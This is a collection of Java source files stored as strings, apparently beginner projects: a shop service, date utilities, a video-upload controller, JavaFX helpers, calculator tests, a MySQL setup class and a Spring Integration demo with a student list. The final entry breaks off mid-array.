    "package cn.itbaizhan.shop.product.service;\n\nimport java.util.List;\n\nimport org.springframework.transaction.annotation.Transactional;\n\nimport cn.itbaizhan.shop.product.dao.ProductDao;\nimport cn.itbaizhan.shop.product.vo.Product;\nimport cn.itbaizhan.shop.utils.PageBean;\n\n/**\n * \u5546\u54c1\u7684\u4e1a\u52a1\u5c42\u4ee3\u7801\n */\n@Transactional\npublic class ProductService {\n\t// \u6ce8\u5165ProductDao\n\tprivate ProductDao productDao;\n\n\tpublic void setProductDao(ProductDao productDao) {\n\t\tthis.productDao = productDao;\n\t}\n\n\t// \u9996\u9875\u4e0a\u70ed\u95e8\u5546\u54c1\u67e5\u8be2\n\tpublic List<Product> findHot() {\n\t\treturn productDao.findHot();\n\t}\n\n\t// \u9996\u9875\u4e0a\u6700\u65b0\u5546\u54c1\u7684\u67e5\u8be2\n\tpublic List<Product> findNew() {\n\t\treturn productDao.findNew();\n\t}\n\n\t// \u6839\u636e\u5546\u54c1ID\u67e5\u8be2\u5546\u54c1\n\tpublic Product findByPid(Integer pid) {\n\t\treturn productDao.findByPid(pid);\n\t}\n\n\t// \u6839\u636e\u4e00\u7ea7\u5206\u7c7b\u7684cid\u5e26\u6709\u5206\u9875\u67e5\u8be2\u5546\u54c1\n\tpublic PageBean<Product> findByPageCid(Integer cid, int page) {\n\t\tPageBean<Product> pageBean = new PageBean<Product>();\n\t\t// \u8bbe\u7f6e\u5f53\u524d\u9875\u6570:\n\t\tpageBean.setPage(page);\n\t\t// \u8bbe\u7f6e\u6bcf\u9875\u663e\u793a\u8bb0\u5f55\u6570:\n\t\tint limit = 8;\n\t\tpageBean.setLimit(limit);\n\t\t// \u8bbe\u7f6e\u603b\u8bb0\u5f55\u6570:\n\t\tint totalCount = 0;\n\t\ttotalCount = productDao.findCountCid(cid);\n\t\tpageBean.setTotalCount(totalCount);\n\t\t// \u8bbe\u7f6e\u603b\u9875\u6570:\n\t\tint totalPage = 0;\n\t\t// Math.ceil(totalCount / limit);\n\t\tif (totalCount % limit == 0) {\n\t\t\ttotalPage = totalCount / limit;\n\t\t} else {\n\t\t\ttotalPage = totalCount / limit + 1;\n\t\t}\n\t\tpageBean.setTotalPage(totalPage);\n\t\t// \u6bcf\u9875\u663e\u793a\u7684\u6570\u636e\u96c6\u5408:\n\t\t// \u4ece\u54ea\u5f00\u59cb:\n\t\tint begin = (page - 1) * limit;\n\t\tList<Product> list = productDao.findByPageCid(cid, begin, limit);\n\t\tpageBean.setList(list);\n\t\treturn pageBean;\n\t}\n\n\t// \u6839\u636e\u4e8c\u7ea7\u5206\u7c7b\u67e5\u8be2\u5546\u54c1\u4fe1\u606f\n\tpublic PageBean<Product> findByPageCsid(Integer csid, int page) {\n\t\tPageBean<Product> pageBean = new PageBean<Product>();\n\t\t// \u8bbe\u7f6e\u5f53\u524d\u9875\u6570:\n\t\tpageBean.setPage(page);\n\t\t// \u8bbe\u7f6e\u6bcf\u9875\u663e\u793a\u8bb0\u5f55\u6570:\n\t\tint limit = 8;\n\t\tpageBean.setLimit(limit);\n\t\t// \u8bbe\u7f6e\u603b\u8bb0\u5f55\u6570:\n\t\tint totalCount = 0;\n\t\ttotalCount = productDao.findCountCsid(csid);\n\t\tpageBean.setTotalCount(totalCount);\n\t\t// \u8bbe\u7f6e\u603b\u9875\u6570:\n\t\tint totalPage = 0;\n\t\t// Math.ceil(totalCount / limit);\n\t\tif (totalCount % limit == 0) {\n\t\t\ttotalPage = totalCount / limit;\n\t\t} else {\n\t\t\ttotalPage = totalCount / limit + 1;\n\t\t}\n\t\tpageBean.setTotalPage(totalPage);\n\t\t// \u6bcf\u9875\u663e\u793a\u7684\u6570\u636e\u96c6\u5408:\n\t\t// \u4ece\u54ea\u5f00\u59cb:\n\t\tint begin = (page - 1) * limit;\n\t\tList<Product> list = productDao.findByPageCsid(csid, begin, limit);\n\t\tpageBean.setList(list);\n\t\treturn pageBean;\n\t}\n\n\t// \u540e\u53f0\u67e5\u8be2\u6240\u6709\u5546\u54c1\u5e26\u5206\u9875\n\tpublic PageBean<Product> findByPage(Integer page) {\n\t\tPageBean<Product> pageBean = new PageBean<Product>();\n\t\t// \u8bbe\u7f6e\u5f53\u524d\u9875\u6570:\n\t\tpageBean.setPage(page);\n\t\t// \u8bbe\u7f6e\u6bcf\u9875\u663e\u793a\u8bb0\u5f55\u6570:\n\t\tint limit = 10;\n\t\tpageBean.setLimit(limit);\n\t\t// \u8bbe\u7f6e\u603b\u8bb0\u5f55\u6570:\n\t\tint totalCount = 0;\n\t\ttotalCount = productDao.findCount();\n\t\tpageBean.setTotalCount(totalCount);\n\t\t// \u8bbe\u7f6e\u603b\u9875\u6570:\n\t\tint totalPage = 0;\n\t\t// Math.ceil(totalCount / limit);\n\t\tif (totalCount % limit == 0) {\n\t\t\ttotalPage = totalCount / limit;\n\t\t} else {\n\t\t\ttotalPage = totalCount / limit + 1;\n\t\t}\n\t\tpageBean.setTotalPage(totalPage);\n\t\t// \u6bcf\u9875\u663e\u793a\u7684\u6570\u636e\u96c6\u5408:\n\t\t// \u4ece\u54ea\u5f00\u59cb:\n\t\tint begin = (page - 1) * limit;\n\t\tList<Product> list = productDao.findByPage(begin, limit);\n\t\tpageBean.setList(list);\n\t\treturn pageBean;\n\t}\n\n\t// \u4e1a\u52a1\u5c42\u4fdd\u5b58\u5546\u54c1\u65b9\u6cd5:\n\tpublic void save(Product product) {\n\t\tproductDao.save(product);\n\t}\n\n\t// \u4e1a\u52a1\u5c42\u5220\u9664\u5546\u54c1\n\tpublic void delete(Product product) {\n\t\tproductDao.delete(product);\n\t}\n\n\t// \u4e1a\u52a1\u5c42\u4fee\u6539\u5546\u54c1\u7684\u65b9\u6cd5\n\tpublic void update(Product product) {\n\t\tproductDao.update(product);\n\t}\n\n}\n",
    "package com.vins_nerf.core.utils;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.lang3.time.DateFormatUtils;\nimport org.apache.commons.lang3.time.DateUtils;\n\nimport java.text.ParseException;\nimport java.util.Date;\nimport java.util.Locale;\nimport java.util.TimeZone;\n\n@Slf4j\npublic class DateUtil {\n    public static final String DEFAULT_DATE_FORMAT = \"yyyy-MM-dd\";\n    public static final String DEFAULT_TIME_FORMAT = \"yyyy-MM-dd HH:mm:ss\";\n    public static final String IMU_INFO_TIME_FORMAT = \"yyyy-MM-dd HH:mm:ss.SSS\";\n    public static final String GMT_DATE_FORMAT = \"EEE d MMM yyyy HH:mm:ss 'GMT'\";\n    public static final String AIMED_DEFAULT_TIMEZONE_NAME = \"Asia/Shanghai\";\n    public static final String AIMED_GMT_TIMEZONE_NAME = \"GMT\";\n    public static final Locale AIMED_DEFAULT_LOCALE = Locale.SIMPLIFIED_CHINESE;\n    public static final Locale AIMED_GMT_LOCALE = Locale.US;\n    public static final TimeZone AIMED_DEFAULT_TIMEZONE = TimeZone.getTimeZone(AIMED_DEFAULT_TIMEZONE_NAME);\n    public static final TimeZone AIMED_GMT_TIMEZONE = TimeZone.getTimeZone(AIMED_GMT_TIMEZONE_NAME);\n\n    static {\n        System.setProperty(\"user.timezone\", AIMED_DEFAULT_TIMEZONE_NAME);\n    }\n\n    public static Date parse(String dateStr, String... dateFormat) {\n        if (StringUtil.isNullOrEmpty(dateStr)) return null;\n        if (dateFormat.length == 0)\n            dateFormat = new String[]{DEFAULT_DATE_FORMAT, DEFAULT_TIME_FORMAT, GMT_DATE_FORMAT};\n        try {\n            return DateUtils.parseDate(dateStr, AIMED_DEFAULT_LOCALE, dateFormat);\n        } catch (ParseException e) {\n            log.error(String.format(\"Fail to parse Date[%s] by Format[%s]\", dateStr, dateFormat), e);\n            return null;\n        }\n    }\n\n    public static String format(Date date, String dateFormat) {\n        return date == null ? null : DateFormatUtils.format(date, dateFormat, AIMED_DEFAULT_TIMEZONE, AIMED_DEFAULT_LOCALE);\n    }\n\n    public static String getDefaultDateTime(Date date) {\n        return DateUtil.format(date, DEFAULT_TIME_FORMAT);\n    }\n\n    public static String getDefaultDate(Date date) {\n        return DateUtil.format(date, DEFAULT_DATE_FORMAT);\n    }\n\n    public static String gmtFormat(Date date, String dateFormat) {\n        return date == null ? null : DateFormatUtils.format(date, dateFormat, AIMED_GMT_TIMEZONE, AIMED_GMT_LOCALE);\n    }\n\n    public static String getGMTDateTime() {\n        return DateUtil.gmtFormat(new Date(), GMT_DATE_FORMAT);\n    }\n\n    public static boolean isDateFormat(String dateStr, String dateFormat) {\n        return StringUtil.isNullOrEmpty(dateStr) ? false : parse(dateStr, dateFormat) != null;\n    }\n\n    public static boolean isDateFormat(String dateStr) {\n        return isDateFormat(dateStr, DEFAULT_TIME_FORMAT);\n    }\n}\n",
    "package ma.xproce.video.web;\n\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpSession;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport ma.xproce.video.dao.entity.Creator;\nimport ma.xproce.video.dao.entity.Video;\nimport ma.xproce.video.service.CreatorManager;\nimport ma.xproce.video.service.VideoManager;\nimport org.springframework.web.multipart.MultipartFile;\n\n\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.UUID;\n\n@Controller\npublic class VideoController {\n    @Value(\"${upload-dir}\")\n    private String uploadDir;\n\n    @Autowired\n    private VideoManager videoManager;\n\n    @Autowired\n    private CreatorManager creatorManager;\n\n    @GetMapping(\"/\")\n    public String index(HttpServletRequest request) {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"loggedIn\") != null && (boolean) session.getAttribute(\"loggedIn\")){\n            System.out.println(\"logged \"+ session.getAttribute(\"username\"));\n            return \"redirect:/index\";\n        } else {\n            return \"redirect:/login\";\n        }\n    }\n    @GetMapping(\"/my-videos\")\n    public String videoIndex(Model model, HttpServletRequest request) {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"username\") != null) {\n            String username = (String) session.getAttribute(\"username\");\n            Optional<Creator> optionalCreator = creatorManager.findByUsername(username);\n            if (optionalCreator.isPresent()) {\n                Creator creator = optionalCreator.get();\n                Optional<List<Video>> optionalVideos = videoManager.getVideoByCreator(creator);\n                List<Video> videos = optionalVideos.orElse(Collections.emptyList());\n                model.addAttribute(\"videos\", videos);\n            } else {\n                System.out.println(\"who are you again? what u doing here? go back to sign\");\n                return \"redirect:/login\";\n            }\n        }\n        else {\n                System.out.println(\"not logged in mate, go back to login\");\n                return \"redirect:/login\";\n            }\n\n        return \"my-videos\";\n    }\n    @GetMapping(\"/index\")\n    public String index(Model model,Model model1, HttpServletRequest request) {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"username\") != null) {\n                Optional<Creator> optionalCreator = creatorManager.findByUsername((String) session.getAttribute(\"username\"));\n                Creator creator = optionalCreator.get();\n                model1.addAttribute(\"username\", creator.getUsername());\n                List<Video> videos = videoManager.getAllVideos();\n                model.addAttribute(\"videos\", videos);\n\n        }\n        else {\n            System.out.println(\"not logged in mate, go back to login\");\n            return \"redirect:/login\";\n        }\n\n        return \"index\";\n    }\n\n    @GetMapping(\"/post\")\n    public String post() {\n        return \"post\";\n    }\n\n    @PostMapping(\"/post\")\n    public String post(@RequestParam(name = \"name\") String name,\n                       @RequestParam(name = \"file\") MultipartFile file,\n                       HttpServletRequest request) throws IOException {\n        if(file.isEmpty()){\n            System.out.println(\"wtf is this bogus\");\n            return \"rediret:post?error\";\n        }\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"username\") != null) {\n            String username = (String) session.getAttribute(\"username\");\n            Optional<Creator> optionalCreator = creatorManager.findByUsername(username);\n\n            byte[] bytes = file.getBytes();\n            String originalFilename = file.getOriginalFilename();\n            String extension = originalFilename.substring(originalFilename.lastIndexOf(\".\"));\n            String uniqueFilename = UUID.randomUUID().toString() + extension;\n            Path uploadPath = Paths.get(uploadDir, uniqueFilename);\n            Files.write(uploadPath, bytes);\n\n            if (optionalCreator.isPresent()) {\n                Creator creator = optionalCreator.get();\n                Video video = new Video();\n                video.setName(name);\n                video.setUrl(\"/\"+uniqueFilename);\n                video.setCreator(creator);\n                videoManager.addVideo(video);\n            }\n        }\n        return ",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\npackage com.dicsstartup.devformfx;\n\nimport javafx.scene.layout.ColumnConstraints;\nimport javafx.scene.layout.GridPane;\nimport javafx.scene.layout.Priority;\nimport javafx.scene.layout.RowConstraints;\n\n/**\n *\n * @author Didier\n */\npublic class DevGrid extends GridPane {\n\n    public DevGrid() {\n        super();\n    }\n\n    public void addConstrainCol(double porcentaje) {\n        ColumnConstraints column = new ColumnConstraints();\n        column.setPercentWidth(porcentaje);\n        column.setHgrow(Priority.ALWAYS);\n        getColumnConstraints().add(column);\n    }\n\n    public void addConstrainCol() {\n        ColumnConstraints column = new ColumnConstraints();\n        column.setHgrow(Priority.ALWAYS);\n        getColumnConstraints().add(column);\n    }\n\n    public void addColsWithWidth(double... width) {\n        for (double w : width) {\n            addConstrainCol(w);\n        }\n    }\n\n    public void addCols(int cantidad) {\n        for (int i = 0; i > cantidad; i++) {\n            addConstrainCol();\n        }\n    }\n\n    public void addConstrainRow(double heigtht) {\n        RowConstraints row = this.row();\n        row.setPrefHeight(heigtht);\n        getRowConstraints().add(row);\n    }\n\n    public void addConstrainRow() {\n        getRowConstraints().add(this.row());\n    }\n\n    private RowConstraints row() {\n        return new RowConstraints();\n    }\n\n    public void addRowsWithHeigtht(double... heigtht) {\n        for (double h : heigtht) {\n            addConstrainRow(h);\n        }\n    }\n\n    public void addRows(int cantidad) {\n        for (int i = 0; i > cantidad; i++) {\n            addConstrainRow();\n        }\n    }\n\n}\n",
    "package com.example.calculadora;\nimport static org.junit.jupiter.api.Assertions.*;\n\nimport org.junit.jupiter.api.AfterAll;\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.BeforeAll;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\n\nclass CalculadoraTest {\n\tprivate static Calculadora calc;\n\n\t@BeforeEach\n    static void inicializarTeste(){\n\tint valorMemoriaInicial = 3;\n        System.out.println(\"Come\u00e7ou o teste!!!!!!!!\");\n        calc = new Calculadora(valorMemoriaInicial);\n    }\n\n\t// Teste para o construtor sem par\u00e2metro de entrada\n    @Test\n    void testConstrutorSemParametro() throws Exception{\n\t\tcalc = new Calculadora();\n        assertEquals(0, calc.getMemoria());\n    }\n\n\t// Teste para o construtor com par\u00e2metro de entrada = 3\n    @Test\n    void testConstrutorComParametro() throws Exception{\n        assertEquals(3, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo somar:somar um n\u00famero negativo (construtor com valor = 3)\n    @Test\n    void testSomarNumeroNegativo() throws Exception{\n        calc.somar(-5);\n        assertEquals(-2, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo subtrair:subtrair um n\u00famero positivo (construtor com valor = 3)\n    @Test\n    void testSubtrairNumeroPositivo() throws Exception{\n        calc.subtrair(3);\n        assertEquals(0, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo multiplicar: multiplicar um n\u00famero positivo (construtor com valor = 3)\n    @Test\n    void testMultiplicarNumeroPositivo() throws Exception{\n        calc.multiplicar(2);\n        assertEquals(6, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo dividir: dividir por valor 0. A divis\u00e3o por 0 dever\u00e1 retornar uma Exception (construtor com valor = 3)\n    @Test\n    void testDividirPorZero() {\n        Assertions.assertThrows(Exception.class, () -> {calc.dividir(0);}, \"A classe calculadora n\u00e3o retornou a exception esperada.\");\n    }\n\n\t// Teste do m\u00e9todo dividir: dividir por um n\u00famero positivo (construtor com valor = 3)\n    @Test\n    void testDividirPorNumeroPositivo() throws Exception {\n        calc.dividir(3);\n        Assertions.assertEquals(1, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo exponencia\u00e7\u00e3o: exponenciar a mem\u00f3ria por 1 \n    @Test\n    void testExponenciarMemoriaPorUm() throws Exception {\n        calc.exponenciar(1);\n        assertEquals(3, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo exponencia\u00e7\u00e3o: exponenciar a mem\u00f3ria por 10\n    @Test\n    void testExponenciarMemoriaPorDez() throws Exception{\n\t\tcalc.exponenciar(10);\n\t\tassertEquals(59049, calc.getMemoria());\n    }\n\n\t// Teste do m\u00e9todo exponenciacao: exponenciar a mem\u00f3ria por valor maior do que 10. Dever\u00e1 retornar uma Exception (construtor com valor = 3)\n\t@Test\n\tvoid testExponenciarMemoriaPorNumeroMaiorQueDez(){\n\t\tAssertions.assertThrows(Exception.class, () -> {calc.exponenciar(11);},\"A classe calculadora n\u00e3o retornou a exception esperada\");\n    }\n\n\t// Teste para o m\u00e9todo zerarMem\u00f3ria. (Utilize o m\u00e9todo getMemoria para verificar se o valor da mem\u00f3ria \u00e9 0).\n    @Test\n    void testZerarMemoria() throws Exception{\n        calc.zerarMemoria();\n        assertEquals(0, calc.getMemoria());\n    }\n\n\t@AfterEach\n    void finalizarCadaMetodoTeste(){\n        System.out.println(\"Finalizando caso de teste\");        \n    }\n\n    @AfterAll\n    static void finalizarTeste(){\n        System.out.println(\"Fim do teste!!!!!\");\n    }\n\n}\n",
    "package sql;\r\n\r\nimport java.sql.*;\r\n\r\n/**\r\n * @author XJC\r\n * @version JDK 8\r\n * @No 202210244314\r\n * @className SqlCreate\r\n * @date 2024/4/1 18:35\r\n */\r\npublic class SqlCreate {\r\n    Connection con; // Connection\u5bf9\u8c61\r\n    Statement st;//Statement\u5bf9\u8c61\r\n    String sqlExecute;//sql\u6267\u884c\u8bed\u53e5\r\n    private static String user;//\u7528\u6237\u540d\r\n    private static String password;//\u5bc6\u7801\r\n    public static final String dbName = \"LibSystem\";\r\n\r\n    public static void main(String[] args) {\r\n        new SqlCreate().DBCreate();\r\n    }\r\n\r\n    //\u521b\u5efa\u6570\u636e\u5e93\r\n    private Connection DBCreate() {\r\n        user = \"root\";//\u6570\u636e\u5e93\u767b\u5f55\u540d\r\n        password = \"123456\";//\u5bc6\u7801\r\n        try { // \u52a0\u8f7d\u6570\u636e\u5e93\u9a71\u52a8\u7c7b\r\n            Class.forName(\"com.mysql.cj.jdbc.Driver\");\r\n            // \u901a\u8fc7\u8bbf\u95ee\u6570\u636e\u5e93\u7684URL\u83b7\u53d6\u6570\u636e\u5e93\u8fde\u63a5\u5bf9\u8c61\r\n            con = DriverManager.getConnection\r\n                    (\"jdbc:mysql://localhost:3306\", user, password);\r\n            //\u6570\u636e\u5e93\u8fde\u63a5\u6210\u529f\r\n            st = con.createStatement();\r\n            //\u521b\u5efa\u6570\u636e\u5e93(\u5982\u679c\u4e0d\u5b58\u5728)\r\n            sqlExecute = \"CREATE DATABASE IF NOT EXISTS \" + dbName;\r\n            st.executeUpdate(sqlExecute);\r\n            //\u5173\u95ed\r\n            st.close();\r\n            con.close();\r\n        } catch (ClassNotFoundException | SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n        return con;\r\n    }\r\n}\r\n",
    "package com.tema1;\n\nimport javafx.application.Application;\nimport javafx.fxml.FXMLLoader;\nimport javafx.scene.Scene;\nimport javafx.stage.Stage;\n\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MathExpressionEvaluatorFX extends Application {\n    @Override\n    public void start(Stage stage) throws IOException {\n        // problema 2\n        FXMLLoader fxmlLoader = new FXMLLoader(MathExpressionEvaluatorFX.class.getResource(\"tema1.fxml\"));\n        Scene scene = new Scene(fxmlLoader.load(), 320, 240);\n        stage.setTitle(\"Evaluator de expresii matematice\");\n        stage.setScene(scene);\n        stage.show();\n\n        MathExpressionEvaluatorController controller = fxmlLoader.getController();\n\n        // problema 1 - citire din consola - rezultatul va fi afisat si intr-un text field din gui.\n        startConsoleInputThread(controller);\n    }\n\n    public static void main(String[] args) {\n        launch();\n    }\n\n    private void startConsoleInputThread(MathExpressionEvaluatorController controller) {\n        Thread consoleThread = new Thread(() -> {\n            Scanner scanner = new Scanner(System.in);\n\n            while (true) {\n                System.out.println(\"Introduceti o expresie matematica: \");\n                String input = scanner.nextLine();\n\n                if (MathExpressionEvaluatorService.validateExpression(input)) {\n                    double resultExp4j = MathExpressionEvaluatorService.evaluateExpressionWithExp4j(input);\n                    double resultShuntingYard = MathExpressionEvaluatorService.evaluateExpressionWithShuntingYardAlgorithm(input);\n\n                    System.out.println(STR.\"Exp4j: Rezultatul expresiei \\{input} este: \\{resultExp4j}\");\n                    System.out.println(STR.\"Shunting-yard alg: Rezultatul expresiei \\{input} este: \\{resultShuntingYard}\");\n\n                    String output = STR.\"Introduceti o expresie matematica: \\{input}\\n\";\n                    output += STR.\"Exp4j: Rezultatul expresiei \\{input} este: \\{resultExp4j}\\n\";\n                    output += STR.\"Shunting-yard alg: Rezultatul expresiei \\{input} este: \\{resultShuntingYard}\\n\";\n\n                    controller.appendTextToConsole(output);\n                } else {\n                    System.out.println(STR.\"Expresia \\{input} este invalida, incearca din nou\");\n                }\n            }\n        });\n\n        consoleThread.setDaemon(true);\n        consoleThread.start();\n    }\n}",
    "package Repository;\r\n\r\npublic class Pojo \r\n{\r\n\tprivate String fname;\r\n\tprivate int fno;\r\n\tprivate String from;\r\n\tprivate String to;\r\n\tprivate String date;\r\n\tprivate String pname;\r\n\tprivate String status;\r\n\tprivate String arival;\r\n\tprivate String dept;\r\n\tpublic String getArival() {\r\n\t\treturn arival;\r\n\t}\r\n\tpublic void setArival(String arival) {\r\n\t\tthis.arival = arival;\r\n\t}\r\n\tpublic String getDept() {\r\n\t\treturn dept;\r\n\t}\r\n\tpublic void setDept(String dept) {\r\n\t\tthis.dept = dept;\r\n\t}\r\n\tpublic String getStatus() {\r\n\t\treturn status;\r\n\t}\r\n\tpublic void setStatus(String status) {\r\n\t\tthis.status = status;\r\n\t}\r\n\tpublic String getPname() {\r\n\t\treturn pname;\r\n\t}\r\n\tpublic void setPname(String pname) {\r\n\t\tthis.pname = pname;\r\n\t}\r\n\tpublic int getPno() {\r\n\t\treturn pno;\r\n\t}\r\n\tpublic void setPno(int pno) {\r\n\t\tthis.pno = pno;\r\n\t}\r\n\tprivate int pno;\r\n\t\r\n\tpublic String getFname() {\r\n\t\treturn fname;\r\n\t}\r\n\tpublic void setFname(String fname) {\r\n\t\tthis.fname = fname;\r\n\t}\r\n\tpublic int getFno() {\r\n\t\treturn fno;\r\n\t}\r\n\tpublic void setFno(int fno) {\r\n\t\tthis.fno = fno;\r\n\t}\r\n\tpublic String getFrom() {\r\n\t\treturn from;\r\n\t}\r\n\tpublic void setFrom(String from) {\r\n\t\tthis.from = from;\r\n\t}\r\n\tpublic String getTo() {\r\n\t\treturn to;\r\n\t}\r\n\tpublic void setTo(String to) {\r\n\t\tthis.to = to;\r\n\t}\r\n\tpublic String getDate() {\r\n\t\treturn date;\r\n\t}\r\n\tpublic void setDate(String date) {\r\n\t\tthis.date = date;\r\n\t}\r\n\t\r\n}\r\n",
    "package com.example.introspringintegration;\n\nimport com.example.introspringintegration.model.StudentMessage;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.messaging.MessageChannel;\nimport org.springframework.messaging.support.MessageBuilder;\n\nimport java.time.LocalDate;\nimport java.util.Random;\n\n@SpringBootApplication\npublic class IntroSpringIntegrationApplication implements CommandLineRunner {\n\n\t@Autowired\n\tprivate MessageChannel outputChannel;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(IntroSpringIntegrationApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args) throws Exception {\n\t\tRandom random = new Random();\n\t\tStudentMessage[] arr = {\n\t\t\t\tnew StudentMessage(\"\u0410\u0431\u0440\u0430\u043c\u043e\u0432 \u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432 \u041d\u0438\u043a\u043e\u043b\u0430\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 12, 16), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0410\u043d\u0438\u0441\u0438\u043c\u043e\u0432\u0430 \u0410\u043d\u043d\u0430 \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u043e\u0432\u043d\u0430\", LocalDate.of(2003, 5, 21), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0411\u0430\u0439\u0434\u0430\u0448\u0435\u0432 \u041d\u0438\u043a\u043e\u043b\u0430\u0439 \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 5, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0411\u0438\u0440\u044e\u043a\u043e\u0432 \u0410\u0440\u0442\u0451\u043c \u041c\u0430\u043a\u0441\u0438\u043c\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 10, 7), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0412\u043e\u0437\u043d\u0435\u0441\u0435\u043d\u0441\u043a\u0438\u0439 \u0414\u0430\u043d\u0438\u0438\u043b \u0418\u043b\u044c\u0438\u0447\", LocalDate.of(2003, 5, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0412\u044f\u0437\u043e\u0432 \u041f\u0430\u0432\u0435\u043b \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 4, 29), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0413\u0430\u0444\u0443\u0440\u043e\u0432 \u0421\u0435\u0440\u0433\u0435\u0439 \u0410\u043b\u0435\u043a\u0441\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 7, 9), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0413\u043b\u0443\u0448\u0430\u043d \u0413\u0435\u043d\u0440\u0438\u0445 \u041a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u0438\u043d\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 11, 13), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0413\u0443\u043c\u0435\u0440\u043e\u0432 \u041c\u0438\u0445\u0430\u0438\u043b \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 8, 12), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0414\u0435\u0441\u044f\u0442\u043d\u0438\u0447\u0435\u043d\u043a\u043e \u041a\u0438\u0440\u0438\u043b\u043b \u0413\u0440\u0438\u0433\u043e\u0440\u044c\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 11, 24), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041a\u0430\u043b\u0438\u043d\u0438\u043d \u0415\u0433\u043e\u0440 \u0410\u043d\u0434\u0440\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 6, 9), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041a\u043b\u0438\u043c\u043e\u0432\u0430 \u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u0430 \u0418\u0432\u0430\u043d\u043e\u0432\u043d\u0430\", LocalDate.of(2004, 3, 6), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041a\u0440\u0430\u0432\u0447\u0435\u043d\u043a\u043e \u041a\u0438\u0440\u0438\u043b\u043b \u041c\u0430\u0440\u043a\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 5, 4), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041c\u0443\u0441\u0442\u0430\u0444\u0430\u0435\u0432 \u041c\u0443\u0445\u0430\u043c\u043c\u0430\u0434\u0430\u043b\u0438 \u041c\u0443\u0445\u0430\u043c\u0430\u0434\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 10, 22), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041d\u043e\u0432\u0438\u043a\u043e\u0432 \u0414\u0430\u043d\u0438\u043b\u0430 \u0412\u043b\u0430\u0434\u0438\u043c\u0438\u0440\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 6, 10), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041d\u043e\u0432\u0438\u043a\u043e\u0432 \u041c\u0430\u0440\u043a \u042f\u043d\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 4, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041e\u0431\u0443\u0445\u043e\u0432\u0430 \u0410\u043d\u0430\u0441\u0442\u0430\u0441\u0438\u044f \u042e\u0440\u044c\u0435\u0432\u043d\u0430\", LocalDate.of(2004, 5, 21), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u041f\u043e\u043b\u044f\u043d\u0441\u043a\u0438\u0439 \u041c\u0438\u0445\u0430\u0438\u043b \u0412\u044f\u0447\u0435\u0441\u043b\u0430\u0432\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 2, 20), random.nextInt(100) + 